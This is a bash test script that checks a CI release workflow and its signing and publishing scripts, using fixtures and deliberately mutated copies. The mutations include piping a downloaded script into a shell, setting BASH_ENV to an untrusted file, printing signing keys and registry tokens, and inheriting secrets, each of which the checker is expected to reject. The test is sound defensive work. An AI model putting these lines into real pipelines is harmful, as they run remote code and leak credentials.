#!/usr/bin/env bash
# proves: REQ-CHAIN-007-AC1, REQ-CHAIN-007-AC2, REQ-CHAIN-007-AC3, REQ-CHAIN-007-AC4, REQ-CHAIN-007-AC6, REQ-CHAIN-007-AC7, REQ-CHAIN-007-AC8, REQ-CHAIN-007-AC9, REQ-CHAIN-007-AC10, REQ-CHAIN-007-AC11, REQ-CHAIN-007-AC12, REQ-CHAIN-007-AC13
# RED until PR 4 is implemented (stage-promote.yml rewritten, bin/release-*.sh, chain-scripts.json rows, the old authorization machinery removed): step 4.
#
# Release, static half (v0.3.0 rules 5, 17, 29, 50, 52, 53, 53b, 56, 57, 60, 61, 63, 64, 65, 69, 70, 71; advisor read-back approved Oct 9 with three
# rulings: rc tags verify like finals, the release policy is signed with cosign so it is in Rekor, signatures in both registries; PR 4 merges into
# chain-v030 only). Runs on ubuntu-24.04 or macOS with: bash, python3 + PyYAML (apt: python3-yaml). No network, no secrets, no keys.
# Every judge lives in bin/chain-release-shape.py and is FIRST proven on a known-good fixture and on mutated copies (a judge that cannot fail
# proves nothing), then applied to the real repository, which must pass. Finite grammars and allowlists, no shell analysis. The behaviour of
# the scripts (what they do with stub records, a stub registry and a fake signer) is in bin/chain-release-scripts-test.sh.
#
# WHAT IS FIXED BY AN EXISTING FILE and what is PROPOSED/UNVERIFIED:
#   [F] the old stage-promote.yml (crane copy by digest to ghcr.io and docker.io, cosign sign in BOTH registries, the environment named release,
#       DOCKERHUB_USERNAME and DOCKERHUB_TOKEN as environment secrets) and apk-tool.py signer (assembly.rsa.pub | release.rsa.pub | unsigned)
#       and the name APK_RELEASE_SIGNING_KEY (cache-3f's interface note: build-apk.sh refuses it).
#   [P] the five script names and their command lines, `melange sign` as the re-signing tool, `crane` as the copy tool, the artifact names, the
#       witnessed helper (bin/witnessed.sh STEP SCRIPT is PR 2's seam; here it is only called), the --rekor-stub flag on stage-start.
set -euo pipefail
root=$(cd "$(dirname "$0")/.." && pwd)
shape="$root/bin/chain-release-shape.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
python3 -c 'import yaml' 2> /dev/null || { echo "FAIL PyYAML is required (apt: python3-yaml)"; exit 1; }
ok()  { pass=$((pass + 1)); echo "ok   $1"; }
bad() { failn=$((failn + 1)); echo "FAIL $1"; }
expect() { # expect ok|caught LABEL WORD args...   (WORD: text the fault message must contain, for caught)
  local want=$1 label=$2 word=$3; shift 3; local out rc=0
  out=$(python3 "$shape" "$@" 2>&1) || rc=$?
  if [ "$want" = ok ]; then
    if [ "$rc" = 0 ]; then ok "$label"; else bad "$label -> $out"; fi
  elif [ "$rc" = 1 ] && grep -Fq -- "$word" <<< "$out"; then ok "$label (caught: ${out:0:80})"
  else bad "$label -> rc=$rc, wanted a refusal containing '$word': ${out:0:140}"; fi
}
mutate() { # mutate SRC DST REGEX REPLACEMENT   (a pattern that no longer matches is a FAILURE, never a skipped case)
  python3 - "$1" "$2" "$3" "$4" <<'PY' || { bad "mutation did not apply: $3"; return 1; }
import re, sys
t = open(sys.argv[1]).read()
pat = re.escape(sys.argv[3][1:].replace("\\n", "\n")) if sys.argv[3].startswith("=") else sys.argv[3]
n = re.sub(pat, lambda m: m.expand(sys.argv[4].replace("\\n", "\n")), t, count=1, flags=re.S)
assert n != t, "mutation did not change the fixture"
open(sys.argv[2], "w").write(n)
PY
}
# ---- known-good fixtures ----------------------------------------------------------------------------------------------
python3 - "$work" <<'PY'
import base64, hashlib, json, os, sys
w = sys.argv[1]
CHK = "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1"
UPL = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1"
DWN = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1"
def dn(name): return f"      - uses: {DWN}\n        with:\n          name: {name}\n          path: {name}\n"
def up(name): return f"      - uses: {UPL}\n        with:\n          name: {name}\n          path: {name}\n"
def inst(t): return f"      - name: install {t}\n        run: ./bin/install-scanner.sh {t}\n"
def wit(step, env):
    e = "".join(f"          {k}: {v}\n" for k, v in env.items())
    return f"      - name: {step}\n" + (f"        env:\n{e}" if env else "") + f"        run: bash bin/witnessed.sh {step} bin/{step}.sh\n"
REG = {"DOCKERHUB_USERNAME": "${{ secrets.DOCKERHUB_USERNAME }}", "DOCKERHUB_TOKEN": "${{ secrets.DOCKERHUB_TOKEN }}", "GH_TOKEN": "${{ github.token }}"}
stage = ("name: 'Stage: release'\non:\n  workflow_call:\npermissions:\n  contents: read\njobs:\n  release:\n    runs-on: ubuntu-24.04\n    environment: release\n"
         "    permissions:\n      contents: write\n      packages: write\n      id-token: write\n    steps:\n"
         f"      - uses: {CHK}\n        with:\n          persist-credentials: false\n"
         + inst("witness") + inst("cosign") + inst("crane")
         + "".join(dn(n) for n in ("witness-build", "witness-rebuild", "witness-check", "provenance", "dist", "locks", "images", "apks", "sboms"))
         + wit("release-verify", {}) + wit("release-apks", {"APK_RELEASE_SIGNING_KEY": "${{ secrets.APK_RELEASE_SIGNING_KEY }}"})
         + wit("release-publish", REG) + wit("release-sign", REG) + wit("release-assets", {"GH_TOKEN": "${{ github.token }}"})
         + up("release-evidence") + up("witness-release"))
open(w + "/stage.yml", "w").write(stage)
open(w + "/release.yml", "w").write("""name: Release
on:
  push:
    tags: ["v*"]
permissions:
  contents: read
jobs:
  decide:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ secrets.AUDITOR_APP_ID }}
  build:
    uses: ./.github/workflows/stage-build.yml
  sign:
    needs: build
    uses: ./.github/workflows/stage-sign.yml
  rebuild:
    needs: build
    uses: ./.github/workflows/stage-reproducibility.yml
  check:
    needs: [build, sign]
    uses: ./.github/workflows/stage-verify.yml
  promotion:
    needs: [build, sign, rebuild, check]
    uses: ./.github/workflows/stage-promote.yml
    permissions:
      contents: write
      packages: write
      id-token: write
""")
# the other chain stage files: no packages write, no secrets
os.makedirs(w + "/o/.github/workflows", exist_ok=True)
for n in ("stage-build", "stage-sign", "stage-reproducibility", "stage-verify"):
    open(f"{w}/o/.github/workflows/{n}.yml", "w").write("name: x\non:\n  workflow_call:\njobs:\n  j:\n    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - run: bash bin/witnessed.sh j bin/j.sh\n")
open(w + "/o/.github/workflows/stage-promote.yml", "w").write(stage)
open(w + "/o/.github/workflows/release.yml", "w").write(open(w + "/release.yml").read())
# bin/release-verify.sh: tag, policy, four stage-starts
V = ['[[ "${GITHUB_REF_NAME:-}" =~ ^v[0-9]+\\.[0-9]+\\.[0-9]+(-rc\\.[0-9]+)?$ ]] || { echo "refused at tag: ${GITHUB_REF_NAME:-} is not vX.Y.Z or vX.Y.Z-rc.N" >&2; exit 1; }',
     'python3 bin/chain-verify.py policy make --template .github/policy/release-policy.template.json --tag "$GITHUB_REF_NAME" --out policy.json',
     "python3 bin/chain-verify.py stage-start --stage release --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json",
     "python3 bin/chain-verify.py stage-start --stage release --previous sign --record provenance/provenance.json --digests witness-build/digests.json --policy policy.json --rekor-stub provenance/provenance.rekor.json",
     "python3 bin/chain-verify.py stage-start --stage release --previous rebuild --record witness-rebuild/rebuild-collection.json --digests witness-build/digests.json --policy policy.json",
     "python3 bin/chain-verify.py stage-start --stage release --previous check --record witness-check/check-collection.json --digests witness-build/digests.json --policy policy.json"]
open(w + "/verify.sh", "w").write("#!/usr/bin/env bash\nset -euo pipefail\n" + "\n".join(V) + "\n")
# the five release scripts, plain, using only their tools; and the list that describes them
os.makedirs(w + "/s/bin", exist_ok=True); os.makedirs(w + "/s/.github/policy", exist_ok=True)
BODY = {
 "release-verify": "set -euo pipefail\npython3 bin/chain-verify.py verify --stage build\n",
 "release-apks": 'set -euo pipefail\nkeyfile=$(mktemp)\ntrap \'rm -f "$keyfile"\' EXIT\nprintf %s "$APK_RELEASE_SIGNING_KEY" > "$keyfile"\npython3 bin/apk-tool.py same apks/a.apk build/a.apk\nmelange sign --key "$keyfile" apks/a.apk\n',
 "release-publish": 'set -euo pipefail\ncrane copy "src@$digest" "dst:$tag"\ncrane digest "dst:$tag" | jq -R .\n',
 "release-sign": 'set -euo pipefail\npython3 bin/vendor-provenance.py evidence --out evidence\ncosign sign --yes "ghcr.io/x@$digest"\ncosign sign-blob --yes --bundle policy.bundle policy.json\njq . policy.bundle\n',
 "release-assets": 'set -euo pipefail\ngh release upload "$GITHUB_REF_NAME" apks/* dist/* --clobber\ngh release create "$GITHUB_REF_NAME" --verify-tag --draft\n',
}
ROWS = {"release-verify": (["python3"], False, ["bin/chain-verify.py"]), "release-apks": (["jq", "melange", "python3", "trap"], "other", ["bin/apk-tool.py"]),
        "release-publish": (["crane", "jq"], False, []), "release-sign": (["cosign", "jq", "python3"], "other", ["bin/vendor-provenance.py"]),
        "release-assets": (["gh"], False, [])}
rows = []
for n, b in BODY.items():
    open(f"{w}/s/bin/{n}.sh", "w").write("#!/usr/bin/env bash\n" + b)
    t, s, r = ROWS[n]
    rows.append({"path": f"bin/{n}.sh", "sha256": hashlib.sha256(open(f"{w}/s/bin/{n}.sh", "rb").read()).hexdigest(), "tools": t, "signs": s, "runs": r, "reason": "fixture"})
open(w + "/s/bin/witnessed.sh", "w").write("#!/usr/bin/env bash\nset -euo pipefail\n")
rows.append({"path": "bin/witnessed.sh", "sha256": hashlib.sha256(open(w + "/s/bin/witnessed.sh", "rb").read()).hexdigest(), "tools": ["timeout", "witness"], "signs": False, "runs": [], "reason": "fixture"})
json.dump({"scripts": rows}, open(w + "/s/.github/policy/chain-scripts.json", "w"))
# a Witness envelope: payload is base64 of a collection with an environment attestor
col = {"_type": "https://in-toto.io/Statement/v0.1", "predicateType": "https://witness.testifysec.com/attestation-collection/v0.1",
       "predicate": {"name": "release-publish", "attestations": [{"type": "https://witness.dev/attestations/environment/v0.1",
       "attestation": {"os": "linux", "variables": {"HOME": "/home/runner", "CI": "true"}}}]}}
def env(c): return {"payloadType": "application/vnd.in-toto+json", "payload": base64.b64encode(json.dumps(c).encode()).decode(), "signatures": [{"sig": "AAAA"}]}
json.dump(env(col), open(w + "/record.json", "w"))
for name, add in (("r_name", {"GH_TOKEN": "x"}), ("r_dh", {"DOCKERHUB_TOKEN": "x"}), ("r_apk", {"APK_RELEASE_SIGNING_KEY": "x"}),
                  ("r_idt", {"ACTIONS_ID_TOKEN_REQUEST_URL": "u"}), ("r_rt", {"ACTIONS_RUNTIME_TOKEN": "t"}),
                  ("r_val", {"X": "SENTINEL-VALUE-123"}), ("r_jwt", {"X": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ4In0.c2ln"})):
    c = json.loads(json.dumps(col)); c["predicate"]["attestations"][0]["attestation"]["variables"].update(add)
    json.dump(env(c), open(f"{w}/{name}.json", "w"))
open(w + "/r_plain.json", "w").write(json.dumps(col))                              # a bare statement, not an envelope
json.dump({"payloadType": "x", "payload": base64.b64encode(b"not json").decode(), "signatures": []}, open(w + "/r_garbage.json", "w"))
PY
expect ok "fixture: the known-good stage-promote.yml passes the stage judge" "" stage "$work/stage.yml"
expect ok "fixture: the credentials reach only the steps that need them" "" credentials "$work/stage.yml"
expect ok "fixture: no other chain file holds packages write or a credential" "" others "$work/o"
rm -rf "$work/o_scout"; cp -r "$work/o" "$work/o_scout"; printf '      DOCKERHUB_USERNAME: x\n      DOCKERHUB_SCOUT_TOKEN: y\n' >> "$work/o_scout/.github/workflows/stage-verify.yml"
expect ok "fixture: the rescan's own read-only Scout token and username are a different credential" "" others "$work/o_scout"
expect ok "fixture: the known-good release.yml graph" "" graph "$work/release.yml"
expect ok "fixture: the known-good bin/release-verify.sh" "" verify "$work/verify.sh"
for n in release-verify release-apks release-publish release-sign release-assets; do
  expect ok "fixture: bin/$n.sh is plain (only its tools)" "" scan "$work/s/bin/$n.sh" "$work/s/.github/policy/chain-scripts.json"
done
expect ok "fixture: all release scripts and the helper are listed with sha256, tools, signs and runs" "" listed "$work/s/.github/policy/chain-scripts.json" "$work/s"
expect ok "fixture: a Witness record with none of the credentials" "" record "$work/record.json" SENTINEL-VALUE-123
mkdir -p "$work/rm" && expect ok "fixture: none of the old authorization machinery" "" removed "$work/rm"
# ---- AC1: the stage file, mutated one rule at a time ----------------------------------------------------------------------
m() { # m NAME REGEX REPL WORD LABEL
  if mutate "$work/stage.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" stage "$work/$1.yml"; fi
}
m s_job2    'jobs:\n  release:'                           'jobs:\n  extra:\n    runs-on: ubuntu-24.04\n    steps: []\n  release:' 'exactly one job'  "AC1 a second job"
m s_selfh   'runs-on: ubuntu-24.04'                         'runs-on: self-hosted'                                   'ubuntu-24.04'       "AC1 a self-hosted runner"
m s_envnone '    environment: release\n'                     ''                                                       'environment'        "AC1 no environment (the credentials would not be protected)"
m s_envoth  'environment: release'                          'environment: agent'                                     'environment'        "AC1 another environment"
m s_pkg     '      packages: write\n'                       ''                                                       'permissions'        "AC1 no packages write (cannot publish)"
m s_att     'id-token: write\n    steps'                    'id-token: write\n      attestations: write\n    steps'  'permissions'        "AC1 attestations write"
m s_noid    'id-token: write\n    steps'                    'id-token: none\n    steps'                               'permissions'        "AC1 no id-token"
m s_cont    '    environment: release\n'                     '    environment: release\n    container: alpine\n'        'job keys'           "AC1 a job container"
m s_jenv    '    environment: release\n'                     '    environment: release\n    env: {X: y}\n'              'job keys'           "AC1 job env"
m s_needs   '    environment: release\n'                     '    environment: release\n    needs: x\n'                 'job keys'           "AC1 a needs inside the stage file"
m s_wf      'permissions:\n  contents: read\njobs'          'permissions:\n  contents: read\nenv: {A: b}\njobs'      'workflow keys'      "AC1 workflow env"
m s_trig    'workflow_call:'                                'workflow_call:\n  push:'                                'workflow_call'      "AC1 an extra trigger"
m s_unp     'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'actions/checkout@v4'                          'digest-pinned'      "AC1 an unpinned checkout"
m s_persist 'persist-credentials: false'                    'persist-credentials: true'                              'persist-credentials' "AC1 persisted credentials"
m s_dlname  'name: provenance\n          path: provenance' 'name: not-listed\n          path: provenance'             'download-artifact'  "AC1 a download outside the allowlist"
m s_dlbin   'name: locks\n          path: locks'          'name: locks\n          path: bin'                           'download-artifact'  "AC1 a download into bin/"
m s_dlgh    'name: sboms\n          path: sboms'          'name: sboms\n          path: .github'                       'download-artifact'  "AC1 a download into .github/"
m s_upname  'name: release-evidence\n          path: release-evidence' 'name: anything\n          path: release-evidence' 'upload-artifact'  "AC1 an upload outside the allowlist"
m s_noup    '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: release-evidence\n          path: release-evidence\n      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: witness-release\n          path: witness-release\n' '' 'only uploads' "AC1 no upload of the evidence"
m s_swap    'install cosign\n        run: ./bin/install-scanner.sh cosign\n      - name: install crane\n        run: ./bin/install-scanner.sh crane' 'install crane\n        run: ./bin/install-scanner.sh crane\n      - name: install cosign\n        run: ./bin/install-scanner.sh cosign' 'start with checkout' "AC1 the installs in another order"
m s_nocos   '      - name: install cosign\n        run: ./bin/install-scanner.sh cosign\n' ''                                                                    'start with checkout' "AC1 cosign is not installed"
m s_snyk    'install-scanner.sh crane'                      'install-scanner.sh snyk'                                'none of checkout'   "AC1 an install of a tool outside the three"
m s_order   'release-apks bin/release-apks.sh'              'release-sign bin/release-sign.sh'                       'exactly'            "AC1 two witnessed steps swapped (release-sign twice)"
m s_miss    '=      - name: release-assets\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-assets bin/release-assets.sh\n' '' 'exactly' "AC1 a witnessed step missing"
m s_extra   'run: bash bin/witnessed.sh release-verify bin/release-verify.sh' 'run: bash bin/witnessed.sh release-verify bin/release-verify.sh && echo done' 'none of checkout' "AC1 an extra command in a witnessed step"
m s_mism    'release-publish bin/release-publish.sh'        'release-publish bin/release-sign.sh'                    'none of checkout'   "AC1 a witnessed step running another script"
m s_direct  'run: bash bin/witnessed.sh release-verify bin/release-verify.sh' 'run: witness run --step release-verify -- bash bin/release-verify.sh' 'none of checkout' "AC1 a direct witness run (the helper is the one seam)"
m s_ghs     '      - name: install witness'                 '      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n      - name: install witness' 'uses not allowed' "AC1 github-script"
m s_comp    '      - name: install witness'                 '      - uses: ./.github/actions/x\n      - name: install witness' 'uses not allowed' "AC1 a local composite action"
m s_login   '      - name: install witness'                 '      - name: login\n        run: echo x | docker login ghcr.io -u u --password-stdin\n      - name: install witness' 'none of checkout' "AC1 a registry login step"
m s_dlafter '      - name: release-assets'                  '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: dist\n          path: late\n      - name: release-assets' 'downloads' "AC1 a download after Witness started (rule 68)"
# ---- AC2: who holds which credential ----------------------------------------------------------------------------------------
c() { if mutate "$work/stage.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" credentials "$work/$1.yml"; fi; }
c c_chk     'persist-credentials: false'                   'persist-credentials: false\n        env:\n          GH_TOKEN: ${{ github.token }}' 'up to release-verify' "AC2 the token on the checkout step"
c c_dlsec   'name: images\n          path: images'        'name: images\n          path: images\n          token: ${{ secrets.DOCKERHUB_TOKEN }}' 'up to release-verify' "AC2 a secret in a download"
c c_vfy     '      - name: release-verify\n'               '      - name: release-verify\n        env:\n          GH_TOKEN: ${{ github.token }}\n' 'up to release-verify' "AC2 any env on the verify step"
c c_apkpub  '=DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-publish' 'DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n          GH_TOKEN: ${{ github.token }}\n          APK_RELEASE_SIGNING_KEY: ${{ secrets.APK_RELEASE_SIGNING_KEY }}\n        run: bash bin/witnessed.sh release-publish' 'release-publish' "AC2 the apk signing key in the publish step"
c c_hubapk  '=APK_RELEASE_SIGNING_KEY: ${{ secrets.APK_RELEASE_SIGNING_KEY }}' 'APK_RELEASE_SIGNING_KEY: ${{ secrets.APK_RELEASE_SIGNING_KEY }}\n          DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}' 'release-apks' "AC2 a registry token in the apk step"
c c_assets  '=      - name: release-assets\n        env:\n          GH_TOKEN: ${{ github.token }}\n' '      - name: release-assets\n' 'release-assets' "AC2 the assets step without its token"
c c_assreg  '=          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-assets' '          GH_TOKEN: ${{ github.token }}\n          DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n        run: bash bin/witnessed.sh release-assets' 'release-assets' "AC2 a registry token in the assets step"
c c_ghsec   '=          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-assets' '          GH_TOKEN: ${{ secrets.OTHER }}\n        run: bash bin/witnessed.sh release-assets' 'whole read' "AC2 GH_TOKEN from another secret"
c c_part    '=DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-sign' 'DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}x\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh release-sign' 'whole read' "AC2 a credential read in part"
c c_foo     '=APK_RELEASE_SIGNING_KEY: ${{ secrets.APK_RELEASE_SIGNING_KEY }}' 'APK_RELEASE_SIGNING_KEY: ${{ secrets.APK_RELEASE_SIGNING_KEY }}\n          FOO: bar' 'release-apks' "AC2 an extra variable in the apk step"
c c_upenv   '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: release-evidence' '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        env:\n          GH_TOKEN: ${{ github.token }}\n        with:\n          name: release-evidence' 'only the witnessed' "AC2 an env on an upload step"
# ---- AC3: nothing outside the release job holds them -------------------------------------------------------------------------
o() { rm -rf "$work/$1"; cp -r "$work/o" "$work/$1"; python3 - "$work/$1/.github/workflows/$2" "$3" <<'PY'
import sys
open(sys.argv[1], "a").write(sys.argv[2] + "\n")
PY
  expect caught "$5" "$4" others "$work/$1"; }
o o_pkg   stage-build.yml '      packages: write'               'packages write'      "AC3 packages write in another stage"
o o_sec   stage-verify.yml '      - run: echo ${{ secrets.X }}'  'packages write or a secret' "AC3 a secret in another stage"
o o_dh    stage-sign.yml   '      - run: echo DOCKERHUB_TOKEN'   'a release credential' "AC3 a registry credential in Sign"
o o_apk   stage-reproducibility.yml '# APK_RELEASE_SIGNING_KEY'   'a release credential' "AC3 the apk signing key named in Rebuild (even in a comment)"
o o_env   stage-build.yml  '    environment: release'            'release environment' "AC3 the release environment in Build"
o o_rdh   release.yml      '# DOCKERHUB_TOKEN'                   'release credential'  "AC3 release.yml names a registry credential"
rm -rf "$work/o_wf"; cp -r "$work/o" "$work/o_wf"; python3 - "$work/o_wf/.github/workflows/release.yml" <<'PY'
import sys
t = open(sys.argv[1]).read().replace("permissions:\n  contents: read\njobs", "permissions:\n  contents: read\n  packages: write\njobs", 1)
open(sys.argv[1], "w").write(t)
PY
expect caught "AC3 release.yml grants packages write at the workflow level" "workflow level" others "$work/o_wf"
rm -rf "$work/o_inh"; cp -r "$work/o" "$work/o_inh"; python3 - "$work/o_inh/.github/workflows/release.yml" <<'PY'
import sys
t = open(sys.argv[1]).read().replace("  build:\n    uses: ./.github/workflows/stage-build.yml", "  build:\n    uses: ./.github/workflows/stage-build.yml\n    secrets: inherit", 1)
open(sys.argv[1], "w").write(t)
PY
expect caught "AC3 a stage call that inherits the secrets" "passes secrets" others "$work/o_inh"
rm -rf "$work/o_cp"; cp -r "$work/o" "$work/o_cp"; python3 - "$work/o_cp/.github/workflows/release.yml" <<'PY'
import sys
t = open(sys.argv[1]).read().replace("  check:\n    needs: [build, sign]\n    uses: ./.github/workflows/stage-verify.yml", "  check:\n    needs: [build, sign]\n    uses: ./.github/workflows/stage-verify.yml\n    permissions:\n      packages: write", 1)
open(sys.argv[1], "w").write(t)
PY
expect caught "AC3 the Check call grants packages write (only promotion may)" "only the promotion job" others "$work/o_cp"
# ---- AC11: the job graph -----------------------------------------------------------------------------------------------------
gm() { if mutate "$work/release.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" graph "$work/$1.yml"; fi; }
gm g_nosign  'needs: \[build, sign, rebuild, check\]'        'needs: [build, rebuild, check]'                          'exactly build'      "AC11 release does not need sign"
gm g_nochk   'needs: \[build, sign, rebuild, check\]'        'needs: [build, sign, rebuild]'                           'exactly build'      "AC11 release does not need check"
gm g_norb    'needs: \[build, sign, rebuild, check\]'        'needs: [build, sign, check]'                             'exactly build'      "AC11 release does not need rebuild"
gm g_extra   'needs: \[build, sign, rebuild, check\]'        'needs: [build, sign, rebuild, check, decide]'            'exactly build'      "AC11 release waits for something else"
gm g_always  '  rebuild:\n    needs: build'                  "  rebuild:\n    if: \${{ always() }}\n    needs: build"  'dry-run and tag gate' "AC11 rebuild runs even when build failed"
gm g_prom    '    uses: ./.github/workflows/stage-promote.yml' "    if: \${{ !cancelled() }}\n    uses: ./.github/workflows/stage-promote.yml" 'dry-run and tag gate' "AC11 release runs when a predecessor was skipped"
gm g_coe     '  sign:\n    needs: build'                    '  sign:\n    continue-on-error: true\n    needs: build'   'continue-on-error' "AC11 sign may fail without stopping release"
gm g_sec     '  check:\n    needs: \[build, sign\]'          '  check:\n    secrets: inherit\n    needs: [build, sign]'  'secrets'  "AC11 the Check call inherits secrets"
gm g_perm    '      packages: write\n      id-token: write\n'  '      id-token: write\n'                                'permissions'        "AC11 the promotion job cannot publish"
gm g_uses    '    uses: ./.github/workflows/stage-promote.yml' '    uses: ./.github/workflows/stage-verify.yml'          'stage-promote.yml'  "AC11 promotion calls another workflow"
gm g_tag     '=  decide:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo ${{ secrets.AUDITOR_APP_ID }}' '  decide:\n    runs-on: ubuntu-latest\n    steps:\n      - run: git tag v9.9.9 && git push origin v9.9.9' 'creates a tag' "AC11 release.yml creates a tag"
if mutate "$work/release.yml" "$work/g_gateok.yml" '  rebuild:\n    needs: build' "  rebuild:\n    if: \${{ !inputs.dry-run && startsWith(github.ref, 'refs/tags/v') }}\n    needs: build"; then
  expect ok "AC11 the one dry-run and tag gate (PR 1's exact conjunct) is allowed on a chain job" "" graph "$work/g_gateok.yml"; fi
# ---- AC4: the order of bin/release-verify.sh ------------------------------------------------------------------------------------
vm() { if mutate "$work/verify.sh" "$work/$1.sh" "$2" "$3"; then expect caught "$5" "$4" verify "$work/$1.sh"; fi; }
vm v_notag   '\[\[ "\$\{GITHUB_REF_NAME[^\n]*\n'            ''                                                       'commands'           "AC4 the tag check dropped"
vm v_wide    '\(-rc'                                         '(-beta'                                                 'not the pinned form' "AC4 the tag rule widened to another suffix"
vm v_nopol   'python3 bin/chain-verify.py policy make[^\n]*\n' ''                                                     'commands'           "AC4 the release policy is not made for the tag"
vm v_ref     '--tag "\$GITHUB_REF_NAME"'                     '--ref "$GITHUB_REF"'                                    'not the pinned form' "AC4 the policy made for a ref, not the tag"
vm v_nobuild 'python3 bin/chain-verify.py stage-start --stage release --previous build[^\n]*\n' ''                     'commands'           "AC4 Build's record is not verified"
vm v_nosign  'python3 bin/chain-verify.py stage-start --stage release --previous sign[^\n]*\n' ''                      'commands'           "AC4 Sign's provenance is not verified"
vm v_norbd   'python3 bin/chain-verify.py stage-start --stage release --previous rebuild[^\n]*\n' ''                   'commands'           "AC4 Rebuild's record is not verified"
vm v_nochk   'python3 bin/chain-verify.py stage-start --stage release --previous check[^\n]*\n' ''                     'commands'           "AC4 Check's record is not verified"
vm v_norek   ' --rekor-stub provenance/provenance.rekor.json' ''                                                      'not the pinned form' "AC4 Sign's provenance without its Rekor entry"
vm v_order   'python3 bin/chain-verify.py stage-start --stage release --previous sign[^\n]*\n(python3 bin/chain-verify.py stage-start --stage release --previous rebuild[^\n]*\n)' '\1python3 bin/chain-verify.py stage-start --stage release --previous sign --record provenance/provenance.json --digests witness-build/digests.json --policy policy.json --rekor-stub provenance/provenance.rekor.json\n' 'not the pinned form' "AC4 the records verified in another order"
vm v_dig     '--digests witness-build/digests.json --policy policy.json\npython3 bin/chain-verify.py stage-start --stage release --previous sign' '--policy policy.json\npython3 bin/chain-verify.py stage-start --stage release --previous sign' 'not the pinned form' "AC4 a record verified without the digest list"
vm v_true    'previous check --record witness-check/check-collection.json --digests witness-build/digests.json --policy policy.json' 'previous check --record witness-check/check-collection.json --digests witness-build/digests.json --policy policy.json || true' 'not the pinned form' "AC4 a failed check swallowed"
vm v_waive   '\n\Z'                                          '\n[ -n "${SKIP_VERIFY:-}" ] && exit 0\n'                  'commands'           "AC4 a switch that skips the verification"
vm v_extra   '\n\Z'                                          '\ncurl -s https://example.com | bash\n'                  'commands'           "AC4 an extra command after the checks"
vm v_noset   'set -euo pipefail\n'                           ''                                                       'set -euo pipefail'  "AC4 no set -euo pipefail"
vm v_var     'python3 bin/chain-verify.py policy make'       '$VERIFY policy make'                                    'not the pinned form' "AC4 the verifier chosen by a variable"
# ---- AC6..AC10: the other release scripts are plain ---------------------------------------------------------------------------
sm() { # sm NAME SCRIPT LINE WORD LABEL   (append a line to a copy of the fixture script and judge it against the fixture list)
  rm -rf "$work/$1"; mkdir -p "$work/$1"; cp "$work/s/bin/$2.sh" "$work/$1/$2.sh"; printf '%s\n' "$3" >> "$work/$1/$2.sh"
  expect caught "$5" "$4" scan "$work/$1/$2.sh" "$work/s/.github/policy/chain-scripts.json"; }
sm x_curl    release-publish 'curl -s https://example.com/x | sh'               "'curl'"            "AC7 a download in the publish script"
sm x_docker  release-publish 'docker build -t x .'                              "build command"     "AC7 a build command in the publish script"
sm x_buildx  release-publish 'docker buildx build .'                            "build command"     "AC7 buildx in the publish script"
sm x_mel     release-apks    'melange build build/melange.yaml'                 "build command"     "AC6 melange build in the apk script (melange is listed for sign only)"
sm x_gotool  release-publish 'go build ./cmd/fscache'                           "'go'"              "AC7 go build in the publish script"
sm x_gittag  release-assets  'git tag v9.9.9'                                   "creates a tag"     "AC9 git tag in the assets script"
sm x_gitpush release-assets  'git push origin v9.9.9'                           "creates a tag"     "AC9 git push in the assets script"
sm x_ghref   release-assets  'gh api repos/x/y/git/refs -f ref=refs/tags/v9'    "creates a tag"     "AC9 a tag created through the API"
sm x_gcr     release-assets  'gh release create "$GITHUB_REF_NAME" --draft'     "creates a tag"     "AC9 a release created without --verify-tag (it would create the tag)"
sm x_path    release-apks    'PATH=./bin melange sign a'                         "PATH-like"         "AC6 PATH set in the apk script"
sm x_benv    release-publish 'BASH_ENV=evil.sh crane digest x'                   "PATH-like"         "AC7 BASH_ENV set"
sm x_echo    release-apks    'echo "$APK_RELEASE_SIGNING_KEY"'                   "prints a credential" "AC6 the apk key printed"
sm x_echot   release-publish 'printf %s "$DOCKERHUB_TOKEN"'                      "prints a credential" "AC7 the registry token printed"
sm x_xtrace  release-publish 'set -x'                                            "tracing"           "AC10 set -x (it would print every credential)"
sm x_other   release-sign    'bash bin/release-publish.sh'                       "starts another script" "AC10 one release script starting another"
